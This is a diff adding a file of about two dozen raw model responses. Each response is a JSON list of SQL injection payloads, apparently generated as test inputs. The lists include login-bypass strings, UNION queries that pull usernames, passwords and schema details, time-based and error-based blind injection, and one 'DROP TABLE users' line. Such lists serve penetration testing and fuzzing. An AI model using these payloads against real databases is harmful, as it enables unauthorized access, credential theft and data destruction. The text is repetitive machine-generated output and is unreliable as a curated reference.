@@ -1,0 +1,417 @@
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "\" OR 1=1 --",
+  "' OR 1=1 #",
+  "') OR '1'='1 --",
+  "' AND SLEEP(5) --",
+  "' WAITFOR DELAY '0:0:5' --",
+  "' AND 1=BENCHMARK(1000000,MD5(1)) --",
+  "'; SELECT pg_sleep(5); --",
+  "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
+  "' UNION SELECT NULL, NULL, NULL --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' OR ''='",
+  "\"",
+  "\" OR 1=1 --",
+  "' UNION SELECT NULL, NULL --",
+  "' AND SLEEP(5) --",
+  "') OR 1=1 --",
+  "\") OR 1=1 --",
+  "' ; DROP TABLE users --",
+  "'"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' OR 1=1 /*",
+  "\" OR 1=1 --",
+  "') OR '1'='1 --",
+  "1 OR 1=1 --",
+  "admin' OR 1=1 --",
+  "' OR TRUE --",
+  "'; SELECT SLEEP(5); --",
+  "'; --",
+  "admin' #"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a --",
+  "admin' --",
+  "' UNION SELECT NULL, DATABASE() --",
+  "' UNION SELECT NULL, NULL, USER() --",
+  "' AND SLEEP(5) --",
+  "' AND (SELECT EXTRACTVALUE(1,CONCAT(0x5c,0x27,version()))) --",
+  "\" OR 1=1 --",
+  "\" OR \"a\"=\"a --",
+  "'); WAITFOR DELAY '0:0:5' --",
+  "') OR ('1'='1 --",
+  "') UNION SELECT NULL, NULL, NULL --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "\" OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "admin'#",
+  "' OR 1=1 /*",
+  "' UNION SELECT NULL, NULL --",
+  "' AND SLEEP(5) --",
+  "' AND BENCHMARK(5000000,MD5(1)) --",
+  "'",
+  "\"",
+  "; SELECT pg_sleep(5) --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "\" OR 1=1 --",
+  "' OR 'a'='a",
+  "' OR 0=0 --",
+  "' OR 1=1 #",
+  "' OR 1=1 /*",
+  "' OR TRUE --",
+  "' AND 1=1 --",
+  "' AND 1=2 --",
+  "' AND SLEEP(5) --",
+  "'; WAITFOR DELAY '0:0:5' --",
+  "'; SELECT pg_sleep(5); --"
+]
+```
+
+--- RAW_RESPONSE ---
+["' OR 1=1 --", "' OR 'a'='a", "\" OR 1=1 --", "1 OR 1=1 --", "' UNION SELECT NULL, NULL, NULL --", "' UNION SELECT database(), user(), version() --", "' AND SLEEP(5) --", "' WAITFOR DELAY '0:0:5' --", "' OR 1=1#", "' AND 1=2 UNION SELECT table_name, column_name, NULL FROM information_schema.columns WHERE table_schema = database() --", "admin' --", "' OR 1=1) --"]
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "admin' #",
+  "\" OR 1=1 --",
+  "\" OR \"a\"=\"a",
+  "' UNION SELECT 1,2,3 --",
+  "' UNION SELECT NULL, database(), user() --",
+  "' AND SLEEP(5) --",
+  "' OR 1=1 LIMIT 1 --",
+  "' OR 1=1 GROUP BY @@version --",
+  "'"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "\" OR 1=1 --",
+  "') OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' UNION SELECT NULL, NULL --",
+  "' AND 1=2 UNION SELECT @@version, user() --",
+  "' AND 1=CONVERT(int,(SELECT @@version)) --",
+  "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
+  "' AND IF(1=1, SLEEP(5), 0) --",
+  "'; WAITFOR DELAY '0:0:5' --",
+  "' AND (SELECT count(*) FROM pg_sleep(5)) --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "' OR 0=0 --",
+  "\" OR 1=1 --",
+  "') OR 1=1 --",
+  "' OR 1=1 #",
+  "' OR 1=1 /*",
+  "' OR TRUE --",
+  "'",
+  "'; SELECT SLEEP(5); --",
+  "'; --",
+  " OR 1=1 --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "\" OR 1=1 --",
+  "' AND SLEEP(5) --",
+  "' WAITFOR DELAY '0:0:5' --",
+  "' AND 1=CONVERT(int,(SELECT @@version)) --",
+  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,USER(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)--",
+  "; SELECT SLEEP(5) --",
+  "') UNION SELECT NULL, NULL, VERSION() --",
+  "' OR EXISTS(SELECT 1 FROM mysql.user WHERE user = 'root') --",
+  "' OR 1=0 UNION ALL SELECT 1,2,3 --",
+  "') AND 1=1 --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' AND 1=2 --",
+  "\" OR 1=1 --",
+  "' AND SLEEP(5) --",
+  "' AND IF(1=1,SLEEP(5),0) --",
+  "' AND extractvalue(1,concat(0x5c,version())) --",
+  "' UNION SELECT 1,2,3 --",
+  "'; SELECT SLEEP(5); --",
+  "' OR 1=1 #",
+  ") OR 1=1 --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "'",
+  "') OR 1=1 --",
+  "\" OR 1=1 --",
+  "' AND SLEEP(5)--",
+  "' AND EXTRACTVALUE(1,CONCAT(0x5c,DATABASE()))--",
+  "' AND UPDATEXML(1,CONCAT(0x5c,VERSION()),1)--",
+  "' UNION SELECT NULL, NULL, NULL --",
+  "' UNION SELECT 1, 2, 3, 4 --",
+  "; SELECT SLEEP(5) --",
+  "admin'--"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "admin' OR 1=1 --",
+  "\" OR 1=1 --",
+  "') OR '1'='1 --",
+  "' OR 1=1 #",
+  "' UNION SELECT NULL, NULL, NULL --",
+  "' AND 1=0 UNION ALL SELECT 1, 'admin', 'password' --",
+  "' OR 0=0 --",
+  "1' OR 1=1 --",
+  "' OR SLEEP(5) --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' OR 1=1 #",
+  "\" OR 1=1 --",
+  "') OR 1=1 --",
+  "' or true --",
+  "' AND 1=2 --",
+  "' AND SLEEP(5) --",
+  "' WAITFOR DELAY '0:0:5' --",
+  "'",
+  "\""
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "1 OR 1=1 --",
+  "' OR 'a'='a",
+  "' UNION SELECT NULL, NULL, NULL --",
+  "' UNION SELECT user(), database(), version() --",
+  "' AND 1=CONVERT(int,(SELECT @@version)) --",
+  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT USER()),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a) --",
+  "' OR 1=BENCHMARK(5000000,MD5(1)) --",
+  "' OR pg_sleep(5) --",
+  "'; SELECT SLEEP(5) --",
+  "' AND SUBSTRING(VERSION(),1,1)='5' --",
+  "1' AND '1'='1"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "admin' --",
+  "' OR 'a'='a",
+  "\" OR 1=1 --",
+  "') OR '1'='1' --",
+  "' UNION SELECT null,null,null --",
+  "' UNION SELECT database(),user(),version() --",
+  "' UNION SELECT null,table_name,null FROM information_schema.tables WHERE table_schema = database() LIMIT 1 --",
+  "' UNION SELECT username,password,null FROM users LIMIT 1 --",
+  "'; SELECT SLEEP(5) --",
+  "1 UNION SELECT @@version,@@hostname,@@datadir --",
+  "' AND 1=0 UNION SELECT null,SCHEMA_NAME,null FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1 --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a --",
+  "\" OR 1=1 --",
+  "' AND SLEEP(5) --",
+  "' UNION SELECT 1,2,3 --",
+  "' UNION SELECT NULL, version(), database() --",
+  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x3a,version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+  "'; SELECT SLEEP(5); --",
+  "'; SHOW DATABASES; --",
+  "') OR '1'='1 --",
+  "\")) OR \"1\"=\"1 --",
+  "admin' OR 1=1 --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "' UNION SELECT NULL, NULL, NULL --",
+  "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+  "' UNION SELECT name, email, password FROM users --",
+  "' UNION SELECT @@version, database(), user() --",
+  "' AND 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9 --",
+  "' ORDER BY 1 --",
+  "' ORDER BY 99 --",
+  "'; SELECT SLEEP(5) --",
+  "') OR ('1'='1",
+  "' OR 1=1 #"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "\" OR 1=1 --",
+  ") OR 1=1 --",
+  "admin' --",
+  "' AND SLEEP(5) --",
+  "' AND pg_sleep(5) --",
+  "' AND BENCHMARK(5000000,MD5(1)) --",
+  "' UNION SELECT NULL, @@version --",
+  "' UNION SELECT NULL, NULL, NULL, version() --",
+  "' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user()))) --",
+  "'; SELECT 1 FROM DUAL; --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "\" OR 1=1 --",
+  "' OR 'a'='a",
+  "' AND SLEEP(5)--",
+  "\" AND SLEEP(5)--",
+  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT DATABASE()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
+  "' AND EXTRACTVALUE(1,CONCAT(0x5c, (SELECT USER())))--",
+  "'; SELECT SLEEP(5)--",
+  "' UNION SELECT NULL,NULL,NULL --",
+  "'; SELECT pg_sleep(5)--",
+  "' XOR 1=1 --",
+  "admin' --"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "1 OR 1=1 --",
+  "' OR 1=1 --",
+  "1 OR 'a'='a'",
+  "1' OR '1'='1' --",
+  "1 UNION SELECT NULL,NULL,NULL --",
+  "1 UNION SELECT 1, 'version', 'database' --",
+  "1 AND SLEEP(5) --",
+  "1 AND BENCHMARK(5000000,MD5(1)) --",
+  "1 AND (SELECT ZEROBLOB(10000000)) --",
+  "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user()))) --",
+  "1; SELECT SLEEP(5) --",
+  "1 OR 1=1 #"
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "admin' --",
+  "' UNION SELECT 1,2 --",
+  "' UNION SELECT 1,2,3 --",
+  "' ORDER BY 1 --",
+  "' AND 1=2 --",
+  "' AND SLEEP(5) --",
+  "'; SELECT SLEEP(5); --",
+  "' OR 1=1 #",
+  "' OR 1=1 /*",
+  "\""
+]
+```
+
+--- RAW_RESPONSE ---
+```json
+[
+  "' OR 1=1 --",
+  "' OR 'a'='a",
+  "'admin' --",
+  "') OR ('1'='1",
+  "\" OR 1=1 --",
+  "' UNION SELECT NULL, NULL --",
+  "' UNION SELECT NULL, NULL, NULL --",
+  "' UNION SELECT username, password FROM users --",
+  "' UNION SELECT tbl_name, sql FROM sqlite_master --",
+  "' UNION SELECT table_name, column_name FROM information_schema.columns --",
+  "' AND SLEEP(5) --",
+  "' AND (SELECT SUBSTR(VERSION(),1,1) LIKE '5') --"
+]
+```
+
